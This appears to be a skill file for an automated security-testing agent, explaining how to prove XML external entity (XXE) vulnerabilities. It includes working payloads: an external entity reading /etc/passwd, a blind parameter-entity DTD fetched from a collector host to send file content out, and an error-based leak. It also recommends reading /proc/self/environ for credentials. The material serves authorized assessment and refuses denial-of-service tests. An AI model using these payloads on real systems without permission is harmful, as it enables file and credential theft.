---
name: web-xxe
description: Prove XXE with a known-file sentinel, or a callback that carries the file — the internal-entity probe that separates three outcomes, content-type smuggling, the formats nobody labels XML, parameter entities for the blind case, and why entity expansion is refused. Use when a body, an upload or a SOAP call may be parsed as XML.
classes: xxe
---

# XML external entities

Proof requirement (`./bin/argus proof xxe`): **a sentinel from a file whose shape
is known, read through the parser — or, for the blind case, that same content
arriving at a collector we control.** Unlike `lfi` no negative control is
required: the entity either put file content into the document or it did not, so
there is no "the response got longer" to rule out.

## One probe separates three outcomes

Before any external entity, send one harmless internal one, through
`http.probe token=argus<nonce>` so the reflection context is on record:

```
<!DOCTYPE r [<!ENTITY sentinel "argus<nonce>">]><r><field>&sentinel;</field></r>
```

| what comes back | what it means | next |
|---|---|---|
| `argus<nonce>` where `&sentinel;` was | the parser expands entities from the internal subset | go external: the only questions left are file permissions and egress |
| an error naming the doctype — "DOCTYPE is disallowed", "external entity", a secure-processing feature | entities are off at the parser | the class is close to dead. Say so and park the hypothesis instead of cycling payloads |
| neither: no error, nothing echoed | the field is not reflected, so no read comes back in band | establish reflection with a plain string, or go blind below |

Expansion is the precondition, not the class — nothing yet about files or egress.

## Where XML goes in when nothing is labelled XML

| entry point | where the doctype goes |
|---|---|
| a JSON endpoint | resend the request as `Content-Type: application/xml` with the body translated. A content negotiator in front of one handler is the whole bug |
| an SVG upload | at the top of the SVG, read back wherever the server renders or thumbnails it |
| DOCX, XLSX, PPTX, ODT | the file is a zip of XML parts: edit `word/document.xml` or `xl/workbook.xml`, rezip, upload |
| SOAP, WSDL, XML-RPC, SAML, RSS or sitemap import, plist | XML by definition, and usually older than the hardening in front of it |

## The external entity, and the two things that break it

```
proof.file_read method=POST headers={"content-type":"application/xml"} candidates=["/etc/passwd"] max_attempts=1
  body='<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file://{payload}">]><r><field>&x;</field></r>'
```

`{payload}` is where the path goes; `candidates` keeps the sweep to the one
request that can work, since `file://../../etc/passwd` reads `..` as a host. The
grade the tool prints is `lfi`'s — re-grade as `xxe`. Two things break the read:

- **Markup in the file.** The content must leave the document well-formed, so a
  `<`, an `&` or a `]]>` is a parse error rather than a read — which is why
  `/etc/passwd` works and source code does not. PHP's
  `php://filter/convert.base64-encode/resource=` sidesteps it; a CDATA wrapper
  from an external DTD is the general answer.
- **What the matrix recognises.** The sentinel check greps for three shapes: a
  `/etc/passwd` line, a `win.ini` section header, a private-key header.
  `/proc/self/environ` is often readable where `/etc/passwd` is not — a distroless
  image may ship no `/etc/passwd`, while `/proc/self` exists for every Linux
  process, is owned by the reader and holds no markup — but an environ span alone
  grades `unproven` here however much it tells you. Read it for the service
  account, and record a credential by kind, never by value — `extracted` is not
  on the redaction path, so a password written there stays (`secret-exposure`,
  its own requirement). Then take the sentinel from a file the matrix knows.

## Blind: parameter entities, and why the error leaks more than the callback

An external entity cannot be referenced inside another entity's value in the
internal subset, so blind exfiltration needs *parameter* entities and our own DTD,
which concatenates the file into a URL:

```
<!DOCTYPE r [ <!ENTITY % d SYSTEM "http://<collector>/<nonce>.dtd"> %d; ]>
```

`proof.oob_start` gives you that URL with the nonce in it, `proof.oob_check` reads
the hits. Then the part that is easy to get wrong: **a callback with no file
content in it does not prove this class.** The verifier greps the response, the
extracted fields and the callback payload for a sentinel, so a hit for
`/<nonce>.dtd` grades `unproven` as `xxe` and `proven` as `ssrf` — a real finding
under its own requirement. The content also arrives URL-encoded while the sentinel
wants a line start: a passwd file whose newlines are `%0a` does not match, so
decode it into the record with `ledger.add_evidence kind=oob`.

**The error-based variant leaks more than the out-of-band one.** Point the
parameter entity at a path that cannot exist with the file concatenated into it:
the parser quotes the URI it failed to resolve, file content and all, into the
response body. No egress needed, it works where the collector is unreachable, and
the content lands in a body span the broker already records. Its limit is one
line per error, and verbose errors are what production turns off first. No
callback is still not a negative result: it may mean the host has no egress.

## What does not count

- A parse error naming libxml2, Xerces, expat or lxml: a fingerprint. So is a 500
  on a `<!DOCTYPE` line — a hardened parser throws there, so does a WAF.
- The internal-entity probe succeeding: the precondition. A collector hit with no
  file content: `ssrf`. A read of a file nobody recognises: real, and reportable
  under the class it bears on. A writeup saying this parser resolves entities by
  default: a candidate, as `knowledge.cve_lookup` says every time.

## Entity expansion is refused here

Billion laughs, quadratic blowup and the external-DTD retrieval loop are `dos`,
which the matrix registers with a refusal, not a requirement: the proof would be
the parser's memory, and on a shared host an outage you caused. Report the
mechanism from what you can read — resolution on, no expansion limit, no
restriction on external DTD access, with the file and the line. That is source
evidence, and where every read is denied it is the strongest support XXE gets.
